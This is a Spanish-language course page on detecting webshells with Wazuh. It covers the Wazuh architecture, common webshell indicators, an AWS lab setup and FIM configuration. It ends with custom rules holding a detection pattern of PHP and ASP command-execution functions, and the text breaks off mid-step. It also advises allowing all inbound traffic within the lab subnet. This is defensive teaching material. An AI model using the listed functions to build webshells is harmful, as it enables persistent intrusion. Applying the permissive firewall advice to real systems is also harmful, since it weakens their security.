
<!doctype html>
<html lang="es" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Configuraci√≥n escenario Wazuh server, clientes Linux y Windows. Reglas para detectar webshells. AWS, Amazon, Terraform, ansible, automatizado, automatizaci√≥n. Apuntes, teor√≠a, pr√°cticas, ejercicio del curso de especializaci√≥n de ciberseguridad. IES severo ochoa Elche. Hacking √©tico. incidentes de seguridad, puesta en producci√≥n segura.">
      
      
      
        <link rel="canonical" href="https://jmperez-profesor.github.io/iabd/Gestion_incidentes/wazuh/">
      
      
      
      
      <link rel="icon" href="../../images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.23">
    
    
      
        <title>Detecci√≥n de webshells con Wazuh - Inteligencia Artificial y Big Data</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#que-es-wazuh" class="md-skip">
          Saltar a contenido
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Cabecera">
    <a href="https://jmperez-profesor.github.io/iabd/" title="Inteligencia Artificial y Big Data" class="md-header__button md-logo" aria-label="Inteligencia Artificial y Big Data" data-md-component="logo">
      
  <img src="../../images/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Inteligencia Artificial y Big Data
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Detecci√≥n de webshells con Wazuh
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="B√∫squeda" placeholder="B√∫squeda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Buscar">
        
        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Inicializando b√∫squeda
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Pesta√±as" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
  
    
  
  Introducci√≥n

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../hf/" class="md-tabs__link">
          
  
  
    
  
  Hugging Face

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../Datasets/Datasets/" class="md-tabs__link">
          
  
  
    
  
  Datasets

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navegaci√≥n" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://jmperez-profesor.github.io/iabd/" title="Inteligencia Artificial y Big Data" class="md-nav__button md-logo" aria-label="Inteligencia Artificial y Big Data" data-md-component="logo">
      
  <img src="../../images/logo.png" alt="logo">

    </a>
    Inteligencia Artificial y Big Data
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introducci√≥n
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hf/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Hugging Face
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Hugging Face
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hf/Ejemplo_gradio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Gradio
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tasks
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Tasks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hf/Tasks_vc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Visi√≥n por computador
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hf/Referencias/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Referencias
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Datasets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Datasets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Datasets/Datasets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Datasets en Hugging Face
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Datasets/datasets_aitor/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cargando datasets en HuggingFace (apuntes de Aitor Medrano)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Actividades
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Actividades
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Datasets/Actividad1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Actividad 1 - Datasets de Hugging Face
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Detecci√≥n de webshells con Wazuh</h1>

<h2 id="que-es-wazuh">¬øQu√© es Wazuh?</h2>
<p>Wazuh, en palabras de su creador, el espa√±ol Santiago Basset, es una proyecto open source que trata de prevenir, detectar y responder a amenazas.</p>
<p>T√©cnicamente podr√≠a considerarse un HIDS (Host Intrusion Detection System). Estos dispositivos usualmente centraban la importancia en los eventos en la red. Sin embargo esta es una tendencia cambiante, como vemos en este gr√°fico de ejemplo de MITRE:</p>
<p><img alt="" src="../img/threats.webp" /></p>
<p>As√≠ pues, Wazuh quiz√°s se acerque m√°s a un <a href="https://wazuh.com/platform/xdr/">XDR</a> o un <a href="https://wazuh.com/platform/siem/">SIEM</a>.</p>
<p>Su objetivo principal es <strong>monitorizar la seguridad de los sistemas, detectar amenazas, responder ante incidentes y facilitar el cumplimiento normativo</strong>, todo desde una √∫nica consola centralizada.</p>
<p>Wazuh se ha convertido en una soluci√≥n ampliamente adoptada por su <strong>versatilidad, escalabilidad y transparencia</strong>, y es utilizada tanto en entornos empresariales como acad√©micos.</p>
<h2 id="historia-y-evolucion">üß¨ Historia y evoluci√≥n</h2>
<p>Wazuh naci√≥ como un <strong>fork de OSSEC</strong>, un proyecto veterano de HIDS, al que se le a√±adieron mejoras sustanciales en escalabilidad, arquitectura modular, interfaz gr√°fica, soporte a tecnolog√≠as modernas y extensibilidad. Con el tiempo, Wazuh evolucion√≥ hacia una soluci√≥n integral de <strong>detecci√≥n y respuesta</strong> que va mucho m√°s all√° del simple monitoreo de logs o archivos.</p>
<h2 id="arquitectura-de-wazuh">üß± Arquitectura de Wazuh</h2>
<p>Wazuh sigue una arquitectura <strong>cliente-servidor</strong> (o mejor dicho, <strong>agente-m√°nager-dashboard</strong>), compuesta por varios componentes clave:</p>
<h3 id="1-agentes-wazuh">1. Agentes Wazuh</h3>
<p>Instalados en sistemas finales (Windows, Linux, macOS), los agentes recogen:</p>
<ul>
<li>Logs del sistema y aplicaciones</li>
<li>Actividad de red y procesos</li>
<li>Cambios en archivos (FIM)</li>
<li>Eventos de seguridad (fallos de autenticaci√≥n, escalada de privilegios, etc.)</li>
</ul>
<h3 id="2-manager-wazuh">2. Manager Wazuh</h3>
<p>Es el n√∫cleo del sistema:</p>
<ul>
<li>Recibe y analiza los datos de los agentes</li>
<li>Aplica reglas de correlaci√≥n</li>
<li>Genera alertas de seguridad</li>
<li>Ejecuta respuestas activas si se configuran</li>
</ul>
<h3 id="3-wazuh-indexer-basado-en-opensearchelasticsearch">3. Wazuh Indexer (basado en OpenSearch/Elasticsearch)</h3>
<p>Almacena y permite consultar grandes vol√∫menes de datos estructurados, como eventos y alertas de seguridad, mediante b√∫squedas r√°pidas y complejas.</p>
<h3 id="4-wazuh-dashboard">4. Wazuh Dashboard</h3>
<p>Interfaz web basada en Kibana/OpenSearch Dashboards:</p>
<ul>
<li>Visualizaci√≥n de alertas, logs, informes y cumplimiento</li>
<li>Gesti√≥n de pol√≠ticas de seguridad</li>
<li>Seguimiento de incidentes en tiempo real</li>
</ul>
<h2 id="capacidades-clave-de-wazuh">üß† Capacidades clave de Wazuh</h2>
<table>
<thead>
<tr>
<th>Funci√≥n</th>
<th>Descripci√≥n</th>
</tr>
</thead>
<tbody>
<tr>
<td>üîç <strong>HIDS</strong></td>
<td>Detecci√≥n basada en host de archivos modificados, nuevos procesos, cambios en el sistema, etc.</td>
</tr>
<tr>
<td>üìë <strong>FIM (File Integrity Monitoring)</strong></td>
<td>Monitorizaci√≥n de archivos cr√≠ticos del sistema o aplicaciones web (muy √∫til contra webshells).</td>
</tr>
<tr>
<td>üìú <strong>An√°lisis de logs</strong></td>
<td>Ingesta y an√°lisis de logs de sistemas, aplicaciones, dispositivos de red, servicios cloud (AWS, Azure, GCP).</td>
</tr>
<tr>
<td>üõ°Ô∏è <strong>Detecci√≥n de amenazas</strong></td>
<td>Reglas de correlaci√≥n que detectan patrones de ataque, como escaladas de privilegios, movimiento lateral o conexiones sospechosas.</td>
</tr>
<tr>
<td>ü§ñ <strong>Respuestas activas</strong></td>
<td>Scripts autom√°ticos para bloquear IPs, cerrar procesos o modificar configuraciones ante incidentes.</td>
</tr>
<tr>
<td>üèõÔ∏è <strong>Cumplimiento normativo</strong></td>
<td>M√≥dulos y plantillas para PCI-DSS, GDPR, HIPAA, NIST 800-53, etc., con informes automatizados.</td>
</tr>
<tr>
<td>‚òÅÔ∏è <strong>Integraci√≥n cloud y contenedores</strong></td>
<td>Integraci√≥n con Kubernetes, Docker, AWS CloudTrail, Azure logs, etc. para visibilidad en entornos h√≠bridos y nativos de la nube.</td>
</tr>
<tr>
<td>üß© <strong>Extensibilidad</strong></td>
<td>Uso de decoders, reglas personalizadas, integraciones con VirusTotal, Suricata, Zeek, TheHive, etc.</td>
</tr>
</tbody>
</table>
<h2 id="casos-de-uso-tipicos">üéØ Casos de uso t√≠picos</h2>
<ul>
<li>Monitorizaci√≥n de seguridad de endpoints (EDR/HIDS)</li>
<li>Detecci√≥n de accesos no autorizados y malware</li>
<li>Detecci√≥n de webshells en servidores web (con FIM + an√°lisis de logs + reglas personalizadas)</li>
<li>Cumplimiento normativo automatizado</li>
<li>Integraci√≥n con herramientas de respuesta a incidentes (SOAR, TheHive, MISP)</li>
</ul>
<h2 id="web-shells">Web shells</h2>
<p>Los cibercriminales utilizan diferentes t√©cnicas para conseguir la persistencia en un sistema previamente comprometido. Una de estas t√©cnicas son las web shells.</p>
<h3 id="que-son-las-webshells">¬øQu√© son las webshells?</h3>
<p>Son scripts web que permiten a los atacantes acceso remoto sin restricciones. Puede pasar que un atacante logra comprometer un servidor, consiguiendo el acceso inicial al servicio web mediante alguna t√©cnica ya conocida (SQLi, XSS, RFI...).</p>
<p>Con este compromiso inicial, se puede intentar realizar la inyecci√≥n de una web shell en el directorio del servidor y que constituir√° un <em>backdoor</em> que dar√° paso a actividades post-explotaci√≥n (ejecuci√≥n de comandos, exfiltraci√≥n de informaci√≥n, infecci√≥n de malware...).</p>
<p><img alt="" src="../img/wazuh1.png" /></p>
<p>La mayor√≠a de los web shells siguen los mismos principios de dise√±o y e intenciones. Normalmente suelen estar escritos en lenguajes soportados por los servidores web: PHP, ASP, ASP.NET, Perl, Python...</p>
<h3 id="indicadores-comunes-de-los-web-shells">Indicadores comunes de los web shells</h3>
<ul>
<li><strong><u>Archivos subidos o modificados recientemente:</u></strong> los atacantes suelen subir sus web shells en los directorios utilizados por los servidores web o modificar archivos ya presentes en ellos. Disonancias en las fechas de modificaci√≥n pueden ser un indicativo.</u></li>
<li><strong><u>Conexiones de red inusuales:</u></strong> las web shell puede que tengan que poner determinados puertos a la escucha para establecer <em>reverse shells</em> o shells inversas hacia los atacantes. Esto producir√° tr√°fico inusual (TCP o UDP), que puede ser un indicador de compromiso.</li>
<li><strong><u>Configuraciones extra√±as/err√≥neas y cabeceras modificadas:</u></strong> cabeceras cl√°siscas de las peticiones HTTP son <em>user-agent</em> o <em>referer</em>. Los atacantes pueden realizar la modificaci√≥n de estas cabeceras de tal forma que se intente una ejecuci√≥n de comandos mediante ellas.</li>
<li><strong><u>T√©cnicas de ofuscaci√≥n:</u></strong> puede que el atacante emplee t√©cnicas de codificaci√≥n, compresi√≥n o sustituci√≥n para intentar ser detectado por los sitemas de seguridad.</li>
</ul>
<h2 id="manos-a-la-obra-configuracion-del-laboratorio">Manos a la obra, configuraci√≥n del laboratorio</h2>
<p>Para este laboratorio utilizaremos AWS, por la versatilidad que nos ofrece y as√≠ deshacernos de los problemas de infraestructa a los que pueda limitarnos nuestra m√°quina. Se van a utilizar <strong>4 m√°quinas</strong>:</p>
<ol>
<li><strong>Amazon Linux 2:</strong> para instalar el servidor de Wazuh.</li>
<li><strong>Ubuntu:</strong> como v√≠ctima endpoint que est√° ejecutando un agente de Wazuh. Correr√° un servidor Apache para aplicaciones PHP.</li>
<li><strong>Windows Server 2022:</strong> otra v√≠ctima endpoint ejecutadno otro agente de Wazuh. Correr√° un servidor IIS para aplicaciones ASP.NET.</li>
<li><strong>Debian:</strong> como m√°quina atacante.</li>
</ol>
<h3 id="wazuh-server-en-amazon-linux-2">Wazuh server en Amazon Linux 2</h3>
<p>La instalaci√≥n del servidor de Wazuh o Wazuh manager se puede realizar siguiendo <a href="https://documentation.wazuh.com/current/quickstart.html">este</a> sencillo tutorial.</p>
<h3 id="agente-wazuh-en-ubuntu-2204">Agente Wazuh en Ubuntu 22.04</h3>
<p>Los pasos vienen detallados <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html">aqu√≠</a></p>
<p>!!!warning "Atenci√≥n"
        Elegid la pesta√±a <strong><em>APT</em></strong>, que es la que os dar√° las indicaciones para realizar las acciones con el gestor de paquetes correspondiente.</p>
<h3 id="agente-de-wazuh-en-windows-server-2022">Agente de Wazuh en Windows Server 2022</h3>
<p>En este caso las instrucciones est√°n <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html">aqu√≠</a> y os dar√° la opci√≥n, en las pesta√±as, de elegir una instalaci√≥n gr√°fica o por l√≠nea de comandos.</p>
<p>!!!Warning "Atenci√≥n"
        Recordad poner como IP de Wazuh manager la de vuestro server de Wazuh.</p>
<h3 id="servidor-web-apache-en-endpoint-ubuntu">Servidor web Apache en endpoint Ubuntu</h3>
<p>Pasos a seguir:</p>
<ol>
<li>
<p>Instalar Apache:</p>
<p><code>console
$ sudo apt-get update
$ sudo apt-get install apache2</code></p>
</li>
<li>
<p>Instalar PHP 8.1 para poder correr aplicaciones PHP</p>
<p><code>console
$ sudo apt-get install --no-install-recommends php8.1</code></p>
<p>As√≠ evitaremos instalar paquetes adicionales.</p>
</li>
<li>
<p>Para verificar la instalaci√≥n podemos acceder a la URL: <code>http://IP_UBUNTU_ENDPOINT</code>y nos mostrar√° la p√°gina por defecto de Apache.</p>
</li>
</ol>
<h3 id="servidor-web-iis-en-endpoint-windows-server">Servidor web IIS en endpoint Windows Server</h3>
<p>Para proceder con esta instalaci√≥n:</p>
<ol>
<li>
<p>En el men√∫ de inicio de Windows, escribimos <code>appwiz.cpl</code> y le decimos <em>Turn Windows features on or off</em>:</p>
<p><img alt="" src="../img/windows-server-wazuh2.png" /></p>
</li>
<li>
<p>En <em>Server Roles</em> instalamos <strong>Web Server (IIS)</strong> conm, al menos, las siguientes funciones:</p>
<p><img alt="" src="../img/windows-server-wazuh.png" /></p>
</li>
<li>
<p>Para verificar la instalaci√≥n accedemos a la URL: <code>http://IP_WINDOWS_ENDPOINT</code></p>
</li>
</ol>
<p>!!!danger "¬°Atenci√≥n, importante!"</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code> En la comunicaci√≥n entre los agentes y el servidor intervienen distintos puertos. &lt;u&gt;**La forma f√°cil de evitaros todo problema**&lt;/u&gt; es a√±adir una regla de seguridad a todas las m√°quinas donde se permite cualquier conexi√≥n entrante (TCP/UDP, cualquier puerto) desde la red 172.31.0.0/16.

Esto no supone un gran problema de seguridad puesto que es el segmento de red **privado** que nos asigna AWS Academy por defecto. En esencia lo que hacemos es dejar que todas las m√°quinas dentro de esa red se comuniquen sin cortapisas.
</code></pre></div></td></tr></table></div>
<h2 id="escenario-hipotetico">Escenario hipot√©tico</h2>
<p>El endpoint Ubuntu corre un Apache con PHP instalado y el endpoint Windows Server corre un servidor web IIS, capaz de interpretar c√≥digo ASP.NET.</p>
<p>Puesto que las web shells se consideran malware post-explotaci√≥n, hemos de asumir que el atcante ya posee acceso inicial a los endpoints. Lo que el atacante desea conseguir es la persistencia en el sistema comprometido con el fin de llevar a cabo estas labores de  post-explotaci√≥n.</p>
<h2 id="tecnicas-de-deteccion">T√©cnicas de detecci√≥n</h2>
<p>Utilizaremos distintas capacidades de Wazuh para detectar la presencia de web shells en PHP o ASP.NET.</p>
<h3 id="integridad-de-ficheros">Integridad de ficheros</h3>
<p>Utilizaremos <strong>FIM (File Integritiy Monitorint)</strong> para deteta rla creaci√≥n y modificaci√≥n de archivos que contengan web shells.</p>
<p>El m√≥dulo FIM de Wazuih puede detectar, casi en tiempo real, cambios en los archivos accesibles via web y de esta forma alertar a los administradores.</p>
<p>Usaremos este m√≥dulo para detectar cuando se han creado o odificado archivos en <code>/var/wwww/html</code>y en <code>C:\inetpub\wwwroot</code>, directorios raiz por defecto en Ubuntu y Windows respectivamente.</p>
<p>Adem√°s, FIM escanea los contenidos de los archivos para monitorizar la aparci√≥n de firmas de web shells cuando los archivos se modifican.</p>
<h4 id="configuracion-de-ubuntu">Configuraci√≥n de Ubuntu</h4>
<ol>
<li>
<p>A√±adir la siguiente configuraci√≥n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p>
<p><code>html
&lt;directories realtime="yes" check_all="yes" report_changes="yes"&gt;/var/www/html&lt;/directories&gt;</code>
Esto detecta los cambios en el directorio <code>/var/www/html</code>.</p>
</li>
<li>
<p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
<p><code>console
$ sudo systemctl restart wazuh-agent</code></p>
</li>
</ol>
<h4 id="configuracion-de-windows">Configuraci√≥n de Windows</h4>
<ol>
<li>
<p>A√±adir la siguiente configuraci√≥n al agente de Wazu en el archivo <code>C:\Program Files (x86)\ossec-agent\ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p>
<p><code>html
&lt;directories realtime="yes" check_all="yes" report_changes="yes"&gt;C:\inetpub\wwwroot&lt;/directories&gt;</code></p>
</li>
<li>
<p>Corriendo una terminal de Powershell como administrador, reinicia el agente de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
<p>```powershell</p>
<blockquote>
<p>Restart-Service -Name wazuh
```</p>
</blockquote>
</li>
</ol>
<h4 id="configuracion-del-servidor-de-wazuh">Configuraci√≥n del servidor de Wazuh</h4>
<ol>
<li>
<p>Crear un archivo de reglas personalizado <code>reglas_webshell.xml</code> en el directorio <code>/var/ossec/etc/rules/</code> y colocar en √©l las siguientes reglas:</p>
<p>```xml title="reglas_Webshell.xml" linenums="1"
<group name="linux, webshell, windows,">
<!-- Esta regla detecta la creaci√≥n de archivos -->
<rule id="100500" level="12">
<if_sid>554</if_sid>
<field name="file" type="pcre2">(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$</field>
<description>[File creation]: Possible web shell scripting file ($(file)) created</description>
<mitre>
<id>T1105</id>
<id>T1505</id>
</mitre>
</rule></p>
<p><!-- Esta regla detecta la modificaci√≥n de archivos -->
<rule id="100501" level="12">
<if_sid>550</if_sid>
<field name="file" type="pcre2">(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$</field>  <br />
<description>[File modification]: Possible web shell content added in $(file)</description>
<mitre>
<id>T1105</id>
<id>T1505</id>
</mitre>
</rule></p>
<p><!-- Esta regla detecta la modificaci√≥n de archivos con firmas asociadas a web shells de PHP -->
<rule id="100502" level="15">
<if_sid>100501</if_sid>
<field name="changed_content" type="pcre2">(?i)passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|show_source|proc_open|pcntl_exec|execute|WScript.Shell|WScript.Network|FileSystemObject|Adodb.stream</field>
<description>[File Modification]: File $(file) contains a web shell</description>
<mitre>
<id>T1105</id>
<id>T1505.003</id>
</mitre>
</rule>
</group>
```</p>
</li>
<li>
<p>Reiniciar Wazuh manager para aplicar la configuraci√≥n de los cambios</p>
<p><code>console
